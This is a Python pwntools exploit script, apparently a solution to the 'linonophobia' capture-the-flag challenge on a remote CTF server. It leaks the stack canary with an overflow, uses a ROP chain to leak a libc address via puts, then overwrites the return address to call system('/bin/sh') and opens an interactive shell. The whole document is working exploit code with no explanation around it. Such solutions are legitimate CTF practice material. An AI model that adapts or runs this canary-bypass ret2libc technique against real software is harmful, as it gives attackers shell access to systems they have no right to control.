from pwn import *

#p = process('./linonophobia')
p = remote('chal.imaginaryctf.org', 42006)
#pid = gdb.attach(p,gdbscript='b * main+254')
payload_leak = 'a'*264

p.sendlineafter('eR!\n',payload_leak)

print p.recv(265)
#print p.recv(7).ljust(8,'\0')

canary = u64(p.recv(7).rjust(8,'\0'))

print 'canary: ',hex(canary)
puts_got = 0x00601020
puts_plt = 0x0400590
main = 0x04006b7
pop_rdi_ret = 0x0000000000400873
ret = 0x0000000000400566
payload = 'a' * 264
payload += p64(canary)
payload += 'AAAAAAA9'
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.recv(100)
p.send(payload)

libc = u64(p.recv(6).ljust(8,'\0'))
system = libc -0x32190
bin_sh = libc+0x13000a
print 'libc: ',hex(libc)

payload2 = 'a'*264
payload2 +=p64(canary)
payload2 += 'AAAAAAAA'
payload2 +=p64(pop_rdi_ret)
payload2 += p64(bin_sh)
payload2 += p64(ret)
payload2 += p64(system)



p.sendlineafter('eR!','b')
p.recv(100)
p.send(payload2)

p.interactive()

